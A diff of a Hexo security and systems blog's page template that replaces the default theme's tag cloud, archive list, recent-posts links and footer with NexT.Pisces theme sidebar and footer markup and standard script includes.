-      <a href="/tags/ARM/" style="font-size: 11px;">ARM</a> <a href="/tags/Algorithms/" style="font-size: 10px;">Algorithms</a> <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/Blockchain/" style="font-size: 11px;">Blockchain</a> <a href="/tags/C-C/" style="font-size: 18px;">C/C++</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Fuzzing/" style="font-size: 15px;">Fuzzing</a> <a href="/tags/IoT/" style="font-size: 12px;">IoT</a> <a href="/tags/Java/" style="font-size: 14px;">Java</a> <a href="/tags/Kernel/" style="font-size: 19px;">Kernel</a> <a href="/tags/Machine-Learning/" style="font-size: 17px;">Machine Learning</a> <a href="/tags/Pwn/" style="font-size: 19px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 13px;">Reverse</a> <a href="/tags/Symbolic-Execution/" style="font-size: 12px;">Symbolic Execution</a> <a href="/tags/Tensorflow/" style="font-size: 10px;">Tensorflow</a> <a href="/tags/Virtual/" style="font-size: 16px;">Virtual</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2020/07/29/so%E6%96%87%E4%BB%B6%E7%9A%84-init-array%E6%AE%B5%E4%B8%AD%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/">so文件的.init_array段中添加代码</a>
-          </li>
-        
-          <li>
-            <a href="/2020/07/09/PID-namespace/">PID namespace</a>
-          </li>
-        
-          <li>
-            <a href="/2020/07/08/Mount-namespace/">Mount namespace</a>
-          </li>
-        
-          <li>
-            <a href="/2020/07/06/User-namespace/">User namespace</a>
-          </li>
-        
-          <li>
-            <a href="/2020/07/01/UnionFS%E6%8A%80%E6%9C%AF/">UnionFS技术</a>
-          </li>
-        
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
       </ul>
-    </div>
-  </div>
 
-  
-</aside>
-        
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
       </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2020 John Doe<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Bruce Fan"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Bruce Fan</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">125</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
     </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bruce Fan</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
   </div>
-</footer>
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
 
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-
-  
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-
-  
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
+        
 
 
 
 
-<script src="/js/script.js"></script>
 
 
 
 
+      </div>
+    </footer>
   </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
 </body>
 </html>
